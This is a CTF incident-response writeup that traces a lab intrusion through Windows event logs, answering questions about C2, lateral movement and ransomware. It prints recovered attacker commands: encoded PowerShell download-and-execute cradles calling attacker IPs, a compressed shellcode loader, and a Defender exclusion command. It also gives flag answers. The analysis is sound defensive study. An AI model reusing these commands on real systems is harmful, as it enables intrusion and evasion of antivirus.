---
title: "ICMTC Finals AnAn IR Writeup"
date: 2024-08-01 01:23:24 +0300
categories: [CTF]
tags: [CTF, Writeup]
description: Huge Incident Responce case where you need to dive deep to get what you ask for.
image:
  path: /assets/images/posts/2024-08-01-icmtcFinals/01.png
---


The finals ended a couple of days ago, and I couldn't fully solve or understand this lab during the competition. So, I took my time solving it and would like to share my approach. Before starting, I'd love to give many thanks to Eng. Mahmoud Swelam, who provided me with the help I needed and much support to finish this writeup. Without further ado, let's jump to the walkthrough.

On July 24, 2024, TechCorp faced a severe cyber threat when their network was infiltrated by the Trojan "Win32/PShellCob.SA." The company's senior network administrator, Emma, discovered the intrusion through an alert indicating the execution of a malicious PowerShell script.



Despite the antivirus software swiftly removing the Trojan, the damage had been done. Later that evening, a ransom note appeared on an infected server, revealing that the company's data had been encrypted by LockBit 3.0 ransomware. The attackers threatened to publish the stolen data on the dark web if a ransom was not paid.

![](/assets/images/posts/2024-08-01-icmtcFinals/02.png)

For this challenge you are given the triage of 4 machines `dc02`, `dc03`, `srv02`, `srv03` and a pcapfile, the task is to answer the some questions.

### Questions

1. First step we need to fingerprint the attacker identity Provide: The used IP, and Port by the attacker c2 server, The used framework for c2 communication, user-agent used by c2 beacon.
2. Identify the entrypoint process information that executed the malicious PowerShell on castleblack machine. Provide the details of the PowerShell process as well.
3. What was the command used by the attacker to evade the Windows Defender?
4. What is the URL of the c2 beacon?
5. While perusing the logs, we noticed a slip-up by the attacker. What was the mistyped command?
6. What was the name of the first malicious service installed on the machine that triggered the alert?
7. Who was the first user that the attacker managed to compromise, and when did this occur?
8. What user was utilized for lateral movement, and what was the corresponding IP address?
9. Identify the MITRE ATT&CK ID that defines the technique used to make the later
10. What are the IP addresses of the attacker's machines?
11. Provide the names of the files downloaded by the C2 server onto the affected machine. Sort the machine names alphabetically.
12. What is the name of the computer account (sAMAccountName) that was created?
13. What CVE was exploited by the attacker to achieve their goal?
14. What is the name of the web shell the attacker managed to upload?
15. What was the first command executed through PowerShell on the web server, and when did it occur?
16. List the names of the computers affected by ransomware. 
17. What is the name of the ransomware file dropped on the machines, and what is its Threat Name by Windows Defender?


I will start by trying to understand what are the machines name/IP in this network. Such info is in the registry so will grep them with `RegRipper`, I will use compname and ips plugins on the SYSTEM hive, in WSL this how the command will be:

```bash
$ ~/tools/RegRipper3.0-master/rip.exe -r ./triage_dc02/C/Windows/System32/config/SYSTEM -p compname
Launching compname v.20090727
compname v.20090727
(System) Gets ComputerName and Hostname values from System hive

ComputerName    = WINTERFELL
TCP/IP Hostname = winterfell

$ ~/tools/RegRipper3.0-master/RegRipper3.0-master/rip.exe -r ./triage_dc02/C/Windows/System32/config/SYSTEM -p ips
Launching ips v.20200518
ips v.20200518
(System) Get IP Addresses and domains (DHCP,static)

IPAddress            Domain
192.168.1.31                                        Hint:
172.16.10.11
172.16.10.101        goad.lab                       Hint:
```
I will repeat the same steps for the rest of the machines, the exact IP of the machine will be confirmed from the logs later.

Next I will use `hayabusa` to try to get info from the logs about what happened, I will generate a timeline for each machine separately. I opened the pcap file and noticed the capture was from 2024–07–24 , so I will start by focusing in events starting from 07–24:

```bash
$ ~/tools/hayabusa-2.14.0-win-x64.exe json-timeline -d ./triage_srv02/C/Windows/System32/winevt/logs/ --timeline-start "2024-07-24 00:00:00 +00:00" -o srv02_0724timeline.json

[TRUNCATED]
Top 5 computers with most unique detections:
critical: castelblack.north.sevenkingdoms.local (5)
high: castelblack.north.sevenkingdoms.local (46)
medium: castelblack.north.sevenkingdoms.local (46)
low: castelblack.north.sevenkingdoms.local (25)
informational: castelblack.north.sevenkingdoms.local (52)

╭────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ Top critical alerts:                                             Top high alerts:                                          │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ CobaltStrike Named Pipe (22)                                     Cmd.EXE Missing Space Characters Execution Anomaly (100)  │
│ CobaltStrike Service Installations in Registry (4)               Suspicious Process By Web Server Process (100)            │
│ CobaltStrike Service Installations - System (4)                  Suspicious Child Process Of SQL Server (26)               │
│ Defender Alert (Severe) (1)                                      Abused Debug Privilege by Arbitrary Parent Processes (26) │
│ Antivirus Exploitation Framework Detection (1)                   Execution via MSSQL Xp_cmdshell Stored Procedure (26)     │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Top medium alerts:                                               Top low alerts:                                           │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Reg Key Value Set (Sysmon Alert) (631)                           Credential Manager Accessed (101)                         │
│ Potentially Malicious PwSh (152)                                 CMD Shell Output Redirect (29)                            │
│ File Created (Sysmon Alert) (118)                                Non Interactive PowerShell Process Spawned (28)           │
│ Uncommon New Firewall Rule Added In Windows Firewall E... (70)   File Deletion Via Del (26)                                │
│ Net Conn (Sysmon Alert) (62)                                     Local Accounts Discovery (16)                             │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Top informational alerts:                                                                                                  │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Logoff (1,811)                                                   Task Executed (119)                                       │
│ Logon (Network) (Noisy) (1,150)                                  Logon (Service) (Noisy) (115)                             │
│ Logon (Network) (658)                                            DNS Query (84)                                            │
│ Proc Exec (644)                                                  File Created (68)                                         │
│ Reg Key Value Set (Noisy) (129)                                  Task Updated (60)                                         │
╰────────────────────────────────────────────────────────────────╌───────────────────────────────────────────────────────────╯
[TRUNCATED]
```

I will save the results Summary of the previous command in a note as I will need this later, also I will repeat the same timeline generation for the rest of the machines and generate `srv03_0724timeline.json`, `dc02_0724timeline.json` and `dc03_0724timeline.json`.

From this output we know the the domain of `castelblack` machine is `north.sevenkingdoms.local`, we will extract the domain of the rest of the machines the same way.

From the gathered information so far with triage folder name, the network shape may be like this:

![](/assets/images/posts/2024-08-01-icmtcFinals/03.png)

I will start analysis from castelblack machine since it's mentioned in the questions, I will check a couple of triggered alerts that was reported by hayabusa. An interesting alert is `Suspicious Child Process Of SQL Server` , to filter that alert out I will use `jq` on WSL like this:

```bash
$ jq '.|select(.RuleTitle=="Suspicious Child Process Of SQL Server")' srv02_0724timeline.json | less -S
{
  "Timestamp": "2024-07-24 14:00:21.728 +03:00",
  "RuleTitle": "Suspicious Child Process Of SQL Server",
  "Computer": "castelblack.north.sevenkingdoms.local",
  "Channel": "Sysmon",
  "Details": {
    "Cmdline": "\"C:\\Windows\\system32\\cmd.exe\" /c dir\"",
    "Proc": "C:\\Windows\\System32\\cmd.exe",
    "User": "NORTH\\sql_svc",
    "PID": 5248,
    "PGUID": "4A64AECA-DEC5-66A0-1305-000000000F00",
    "ParentPID": 3700,
    "ParentCmdline": "\"c:\\Program Files\\Microsoft SQL Server\\MSSQL15.SQLEXPRESS\\MSSQL\\Binn\\sqlservr.exe\" -sSQLEXPRESS\"",
}

```
I deleted a couple of lines to highlight that a sqlservr.exe process started a cmd.exe process and executed a command, so lets see what else was executed. for this I will just focus on Timestamp and Cmdline feilds

```bash
$ jq '.|select(.RuleTitle=="Suspicious Child Process Of SQL Server")|{Timestamp,cmd:.Details.Cmdline}' srv02timeline.json | awk '!/\{/' | awk '!/\}/'| less -S
  "Timestamp": "2024-07-24 14:00:21.728 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c dir\""
  "Timestamp": "2024-07-24 14:04:45.076 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEALgAxADMAOgA4ADAALwBhAG4AYQBuACcAKQApAAoA\""
  "Timestamp": "2024-07-24 14:17:18.038 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell Add-MpPreference -ExclusionPath C:\\\""
  "Timestamp": "2024-07-24 14:18:46.806 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c ipconfig /all\""
  "Timestamp": "2024-07-24 14:21:07.258 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell -exec bypass -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEALgAxADMAOgA4ADAALwBhAG4AYQBuACcAKQApAAoA\""
  "Timestamp": "2024-07-24 14:26:13.059 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMQAuADEAMAA5ADoAOAAwADgAMAAvAGEAbgBhAG4AYQAnACkAKQAiAAoA\""
  "Timestamp": "2024-07-24 14:29:32.121 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA2ADEAWABhADIALwBxAE8AaABiADkAMwBQADYASwBmAEQAZwBTAG8ARgBJAEsANABYADEASABsAFcANgBBAEEARQBsAEkAZQBJAFIAMwBiADEAVwBGAHgASQBEAEIAZQBUAGsATwBKAEwAbAB6AC8AdgB2AFkAQQBYAHAANgA1AHIAUQB6AFIANQBwAEIAaQBtAEkANwAzAG4AcwB2AHIALwAzAHcAUgBnAGYAawBVAFMAYwBZAG0AawBSADEATABjAEEAOQB6AGcARQBPAG8ATwB0AHcALwBQADMAOQBOAG4AUgBNAHcAcwBaAHMAOABMAFkARAA1AE0AMwBEAHIAdgBsAG0AVwBCAFkARwBRAGMARAA5AGYAWAA4ADMATQByAEIAaABjADkAbAB2AEoAdwBPAC8AMgBhADQAVgBJAHAARABuADAAZwBuAGIAQwBLAHcAUQBnADkAegBkADMAZgAxAGQAdQBoAFEANgBnAGIARQBGAGIANAA1AEIANABBAG0AOAAyAFkARABzAFgAUwB2AGcAbgByAG4AcwBpACsAQgA1AEgAZABjADIAbwBQAFAANgB4AHgALwB0AEUARwBQAGcAawBNAHUAOAAwAEEATgBFAEMAQQBKAGcAYgB4AEEARQBRAFQAYgBIAC8AWgBOAGIANwBBAEUARwBqADgAUABOAEEAWgBpAEUAKwA1AHYANwA5AGwAYgBvAEkAWABkAGoAbwBPAHUAMgB1AEcAMgBZAGUAMwBvAEsAdwBiAEgAWQB0ADQARgByAEcAdQB3AEUAQgBkADEARABrAEcAUQB6AGYALwAyAFYAeQBiADAAOABsAGwANABMAG8AaAA4AGEASwBNAGgAbQA5AEQAZwBnAHcAQwA1AFkAQwBHAFYAeQAzAFAAYwBjAE0AegBpAE4AUABaAEQATgBxAE4ARABFAGIAdQBCAHUAUwBXAEUAQgBuAFQASgBmAG0ASwBYAG8AdABSAFMAOABlAHMARwBlAHkAVgAxAFAAdAB2AE0ATQBlAG8ANgB2AEQAOABtADAAWABtAFMAeQBHAFQAbwBjAFUAVwA2AEUAQwA0AGUAWgBQAFAAZgBDADcATAAyADgAdgBuAEoALwB2AHEATwBaAGgAQQA2AEIATgBpAGgASQBEAGcASABZADkAWABTAEEAVAA5AEEARQBRAGEARgB2AE8AQgBZAEMARQA3AEMAbABZAHAAbQBBACsAcwB6AFoAWgBYAEkAVQBCAEEAWQBrAHgAQQA1ADMAdwAwAEwAbABUAHUANABSAFoATAA4ADUASQBVAEoANQBxAHYAZgBsAGQALwBXACsAWgBqAFYAdwB2AHAASAA3AHUAMABMAFoAagAwAEoAMAAxADQAagBnAFgAUAA0AGEARQA3ADkARABoADUAcgBHAHoAVQBVAGQAUABjADQAdgA2AEQAOABFAFYANAA3ACsAZgBnAG0AdwAzAFAAMwAzAHoAMABMAFYAQQBnAGoAcwBEAEEATABlAEMATwBYADMAUQA2AHoAZQAzADkAMgA5AHAARQBOAEEAegA1AE0AZAB1AFEARgBNADUAWgA2ADUAWQBwADUAVABLAFEAaQBEAHUARABoAG0ANwBwAHoAaQBFAE8AUgBlAGYALwBqAG4AWQB2AFkAbQBHAGUAUwAvAFYARgBTADYAUwBWADEAbABMAHUANgA1ADQASABqAG0AWAB1AFkAdQB0AEYANwB2ADcAMwBMADMAMQArAGgAaAA2ADIAKwBiAEUAQwBJAEwAWQBQAGIAOQA2ADIAegBvAGcAQwAxADAAUQBDAGQAMgBEAEIAdQBhAHQANABEAFAAZgB1AFkAegBzAEUAVQBnADUAYQBOAHcAMgA2AFoAUgBuAE4AbgBNADkAUQBPAHcATwBsAGQAMgBNAG8AegBRAGwAMQAvAEYAUgBCAHUAUwBkADkAbgBXAEIAWgB4AGcAVQByADgASABGAEIAVQBOAGkAZAB6AFAAWQBDADQAKwB6AEcAWQBrAFIAdwBVADIANQBlADgAeQBwADIASAA2AGIAVQB2AFQARABOAHgAMgBYADEATQByAHYAbABsAG4AYwB4AGIATABiAFcAUQBFAFEAWgA0AGIAaABUAFQAUAB6AFQAeQBuAEEAdwBNAEIASwA4ADgASgBUAGcAQwB2AG4ANABTAFEAdQBPAGsAdwA4AHcATwB1AEcAaQBJAEMAVABTAE0AZwBOADMAVwB2AHUAVQA4AG8AdgBaAHAAdQB1AHcANwBOAG0ATgBDAGsAMwBxAFUAMABUAEgAVQBQAG0ATgBCAEEAagBKAFUAOAAxADQAYwBXAGEATQBVADYAMwBOADAAZwBaAEQANwBsAHAARwAwAGcAUgBGAE8ATwBhAGoAcABSAG4AOQBBAFYAeABvAFYATwBXAE0AeABnAEsALwAvAHYAOABaAEUAcgA2AEkAQgBJAHQAbwBlAEEAVABYAGUAbgBWAGEAaQBMAGoAQgAyAHQATwBkAGUATQBTAHMAUABOADIAQQBFAHIAOAB4ADkAZwAzAC8ATABrAGsAaABTAE0AcQB4AHQASgBIADAARABUAEEATgBDAFIAUwAvAEwAYwBIAEcASgBDADYAMQBvAG0ALwAwAHYAZwAvAFcALwB3AGYAaQA0AHgAUAA4AEYAcwBZADMAQgAxAFoARABaAE4AUgBHAGwATABDAC8AcQBsAEMAbABCADIAQQBwAGoAUQBZAGcAeAA4AHIAcABGAGoASwBmAGoAUwBpAGcAbgBMAHAAVgBTAE4AeQBhADYAYgA1ADMAZQBpAFUAMQBvAHgAbwBVAEoAZAA3AE4AbwB0AEkAdwBDADEAaQBwADcAVwB1AEcAeQBtAHoASQBlADcAcQBEAGsAYQAxAEcATAAxAEkAUABGAHkAdgBIAEsAMAB5AEgAVABtAFcARAB4ADEAZQAwAFoAdABIADQAMwA1ADAARABXAG4AQgBQAHQAOQBzAFUAUABuAEUANQBNAFAAQQB0AFIARAAzAG0AWQAvADgASQAxAG8AYwBEAGgARQB6AGYAWQB5AEYAawBjAEMAUAA0AEEAMQBXAEkAVgBTAE8ARwBnAGwAVABoAGUAYQBOAHAAVQBiAEQAOQAzAFYAcABJAG0AbABrADkAWgAxAFUAVgBCAFgAMgB0ADMARgB6AEkAQQBIAFAANwBVAFYAMgBwAFcAUwBKAFIAcgB4AEkARABGAHIAZQB6AHoAawBnAGIAcwA2AGEANwA1ADAARwBnAG4AVwA0AG0AVABXAGIATQBYAHQAMQBnAGkAVgBuAFkAZABpADYARwBFAHgASABJADUAVwA0AGMAQQBmADIAQgBLAHMANwBFACsAZABPAFoARgBQAFUAcQAvAFIAVgAvAGkAVgAwAFUAQwBiAE8AawBqAGwATABaAC8AWgBXAHYAbQA3AGsAOABIAG0AUwBaAFAATgBvAGQAOABHAG0ATgBsAFoAVQBmAFoAQgB1AFYAUQBEAEMANwBtACsAYwBqAHcASQBGAHUARQB1AE8AVwB2AFEAdABKAEkATwA0AEcAVwA2AEgAcgBxAHEANgBRAFYAbABMAFQARwAzAHgAKwBQAEIAOABFAG8AegAvAFYAaABTAHAAcgBQADEAawBuAEoAVABNAG4AegBjADMAZABTAHcAdgB2AEwAUQBhAFMANwBNAGoAdQBYAFIARwBxAGYAWQBUAGwAMgBLAFUAVwBNADQAbwBjAG4ATAB5AGMAbwA3AHIAcQAyADUATAA1AFoASABHAHkAVgBvADAANwBPAFcARQBmAFoARABHAGQAcgBOAFgAVQBlAEsAcgAvAHQAcwBPAGQAYgAxAEYAbgAwAHIAYQAwAHYAeABHADEAVQByADQAZQBPAHUAVgB6AEYAcQBHAEYASgBlAEkAMgBxAHIAegBqAGcAMgBaADgARgBCAEIARQBQAEgAWABIAGEAaABiAGUANwA1AHoAdQBSAGcATgB1ADMAUQByADEATABzAGwAYgA0AG0ASwA4AHMASQArADAAUgBaAGoANQBpAGQANAB2AEcAZwAxADkAUQB4AHQAZQBIADcAZwBRAFoAcAA5AFQAagBRAE0AYgBUAG4AYQAzAFEAeQBsAHEAbABjAGsAVAA0AFAAQwAzAHkAcwBOAEIATwB6AHIARQBVAE0AUwAyAFEAdQBsAEgAVQBIAHoAdQBvAEwATABlAEcAOQBVAEEAMAA4AFgASQBGAFUARABwAGUASAA1ADgAQwByAE4AZQBoADQASgBCADEAVgAzAEoAZQBnAGUAbwBoAHIAZgBTAHAAMwBWAGgAZQBPADEAaABKADEAYgBUAFYAWgBMAHkAbwBiAFgAbgBvAG8AawBzAE0ANABuAGoAcQBvAE4AaAA1AFcAMgByAEoAZgBUAGsAcgBuAGcAVwB5AGQAbABLAEMAOABpAFgAZAA2ADQAcQBQAHoATQBoADYAYwAxADAAcQBVACsATgBhAFQAUwBIAGoAcABoAEwAWQBWAFQAQgBUACsAegBQAHQASQBGAE4AcQBOAEcAbABFAEcAbQAwADcAcwBlAFgAdgB3AGgASQBqAGQAMAB0AGIAegArAHMAbQBhAFMAdQBYADEAZQBJAEwARQA0AGUAbwA0ADYAVQAzAG4ANQBsAHIAZwBxACsAcABpADUAbwAyAG0AUgBVAG4AdABuAG8AdABUADQAVQB5AEUAcQBWAGkAZABqAHAARwBsAGoARwBmAE4AWABrAC8AUQBRAHIAUABuADIAVQBJAFUAYQBHAEsAMAA2ADEAaQBpAHAAMAAyAEsAMABXAHcAbQBhAE0AUwBpAHMARABzAFQAYQBTAFcAVQByAFkAbAArAHQASgBpACsAVgBBAGUAVgA4AGEAZQB6AHUAVwBvAFcANQBhAFYAKwBMAGsANwBhAHMATwBKAEoAMABXAFkANgBqAE8AUwBrAFEAcAAxAFMAMQByAFgATgBZAFYAYwBiAFIAUABPAEIAUAAzADkAQwBFAHQAagBhAFUAQgBqAGoAZAByAE0AdgBCAEEALwByAGgAUwAwAHYAcQB0ADAAbgA0AEQAVwBlAEQASwBNAG8AaQBjAHUAVgBXAEMAVQByAEoAVABiAFUAMgBuAFEAZwA5ADIAWQBOAEUAUwBRAGEAWAA2AC8AegB1AEcAYQBwAEYAZAA0AGYASAA3ADMAdABrAHAAcgBmAGoAUgBzADcAMABEADYAdQBSAHAASQA4AE4AYgB0AEwAQgBTAFgAYgArAFYAVAB0AHoAMgBjAHIAMQBJADcAbABoADQAZQA2AFUAawB5AG0AagBVAGwAMwA5AHkAUwBQADIAaQBkACsAcgA5AFUAcgBUADEAagBUAGkAcwBmAEEAZwBlAGgAUQBtAGgATwBsADMAcAB4ADYALwBFAGoAYwBZAEQAUwB0AFIAeABpAEgAbwB0AFEAKwA5AGoAZQA3AGUAZgBIADQAWQBMAFUAUAAyAEgAOABhAEQAdgBhAGwAOABHAHkAWgB2AGwASgBzADgATQA2AFQAbgBMAFQAdwAyAEEAMABhAGkAZABUAGEARABvAGYANwBiAGwAMwBEAHYAUQBmAGwANABUAEQAcwB6AE8AdQBsAEYAcgAwADcAawA2AEIAMgAzAE0AVQByAGQAZABhAEoANwBNAE8AaABOAEoAVABrAFoAcgBYAFQAVwBKAFEAbgB4ADYAYgBTAEYAdwBlAFYASQBwAFQAMQBOAGYASgBiAFUASQBPAE8ATgBWAHoAcwBsAGkAeQBtAEEAcgAzAG0ASABXAGsAKwBxADQAZQBWAEYAeAB6AFUAbQBMADAAOQBHAG4AZgBzAGoAZQByADcAYwBxAGYASAA4AGkAVABvAHQAOAA0ADAAdABrAFgANgA2AFAAUwBwAHMAcgAwAEMAMwBVAFAAagAzAEsARAA1AEUAaABFAEQAdAA5AGcAKwBkADIAaAAyAHYARgBCAGIAbwB0AG4AQwBsAFgAcwBCAHIAQwBpAGIAdwAvAHcAMABxAFkATQB5AHcAVABLAE4AUAB4AHEAWABTAFUAVQBsAFoAcABrAGsAcAByAGcAZgBUADYAZwAvADUALwBUAFIAeABMADEAcQBTAEoASABUADEASwB2AFMAYwAxAHAAVwB0AHkANgBtAG4AVgBMAEUAdQBvADkALwBjAFAAVAA5AGkAQQBqADMAWABoAHgAcABTAGEAUwBsAG0ASwAwAC8AUABLAFQAbAA4ACsANwA5ADAAOAB1ADMANgBQAFgAVwBjAHIANwBQAEgAegBjAFIAVgBWAGUAdQAzAHQAOQA5AHYALwBVAFcASgArAE4ARABoAGYAMgBxAGsAMQBNAE4ASABPAHcATgBSAEMAcwB2ADcAYwBaAHUAZAAyAG4AWAB4AGQAMQByAFQAegBWAHkASQBaAFAASQBaAGoALwAvAEcAMwBBAEUAMgBBAEcASQB0AHMAaQAwAGkAYgA3AGQAUQBBAEoAQwByAHMAbQA2AHcAQwAvAGEAcwBUAC8AZgA3AHcAaAA2ADAAOAA3AG8AcwBNAHgALwBPAHMAcgA5AHUARQB4AHkAdQBkAHMAMQB1AFEAbQAzADIANwBSAFYAdQBoADcAeAAxAGoASAArAHUASABiAFcAOQBIAHoANQBEADAAUQBPAGcATABNAGoAKwB6AHgAWABqAE0AcgBGAFkAcABHADkASwAwAFcAcQA3AGYAZQBKAGEAYgB0AGUAbgBIADMAWABsADIAZQA5ADQAZwBjAG8ASAAwADIAaAAxAE4AUgA3AGMANABkAEQAeAB3AGIALwBSAHgALwA4AFoAUABXAC8AcwA4AHYANABTAC8AdgBOAEgAKwB5AGwAaQBEADYAbgBqAEYAMwBnAC8AdwBLAEQAbwArAFcAVwBEAHcANABBAEEAQQA9AD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=\""
  "Timestamp": "2024-07-24 14:33:33.452 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c whoami\""
  "Timestamp": "2024-07-24 14:34:20.688 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell Get-MpComputerStatus\""
  "Timestamp": "2024-07-24 14:37:25.343 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c iwr -uri http://10.10.100.100/download/file.exe -outfile file.exe\""
  "Timestamp": "2024-07-24 14:38:06.768 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell iwr -uri http://172.16.10.109:8000/anana.exe -outfile svchosts.exe\""
  "Timestamp": "2024-07-24 14:41:09.586 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c dir C:\\Users\\sql_svc\\AppData\\Local\\Temp\""
  "Timestamp": "2024-07-24 14:42:27.345 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell iwr -uri http://172.16.10.109:8000/anana.exe -outfile C:\\Users\\sql_svc\\AppData\\Local\\Temp\\svchosts.exe\""
  "Timestamp": "2024-07-24 14:43:05.066 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c C:\\Users\\sql_svc\\AppData\\Local\\Temp\\svchossts.exe\""
  "Timestamp": "2024-07-24 14:43:09.067 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c C:\\Users\\sql_svc\\AppData\\Local\\Temp\\svchosts.exe\""
  "Timestamp": "2024-07-24 15:21:41.836 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell Start-Process -FilePath C:\\Users\\sql_svc\\AppData\\Local\\Temp\\svchosts.exe\""
  "Timestamp": "2024-07-24 15:36:23.278 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell iwr -uri http://172.16.10.109:8000/anana.exe -outfile C:\\Users\\sql_svc\\AppData\\Local\\Temp\\svchosts.exe\""
  "Timestamp": "2024-07-24 15:36:30.825 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c dir C:\\Users\\sql_svc\\AppData\\Local\\Temp\""
  "Timestamp": "2024-07-24 15:36:35.988 +03:00",
  "cmd": "\"C:\\Windows\\system32\\cmd.exe\" /c powershell Start-Process -FilePath C:\\Users\\sql_svc\\AppData\\Local\\Temp\\svchosts.exe\""
```

So it seems that the user NORTH\sql_svc is compromised and those commands were executed for over an hour. There is an encrypted powershell payload that tried to download some exe file from the c2 server and a shellcode. This was the entrypoint for the execution of the malicious PowerShell on castleblack machine. `Q2:EGCERT{sqlservr.exe:3700}`

We note that the third command is trying to add an exclusion path to Microsoft Defender Antivirus, and this is how the attacked evaded the Windows defender. `Q3:EGCERT{powershell Add-MpPreference -ExclusionPath C:\}`

If we inspected the rest of the executed commands we can see the URL of the c2 beacon `Q4:EGCERT{http://172.16.10.109:8000/anana.exe}`

Now we know an IP of the attacker which we will use to see what else did he do. Also if we focused in those commands we can spot the mistyped command that he attacker did, it is executing the "svchossts.exe" with double s `Q5:EGCERT{C:\Users\sql_svc\AppData\Local\Temp\svchossts.exe}`

There was multiple encoded powershell commands, I will decode them to understand more about what happened, here is the output :
 
 ```bash
 IEX ((new-object net.webclient).downloadstring('http://172.16.1.13:80/anan'))
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.1.109:8080/anana'))
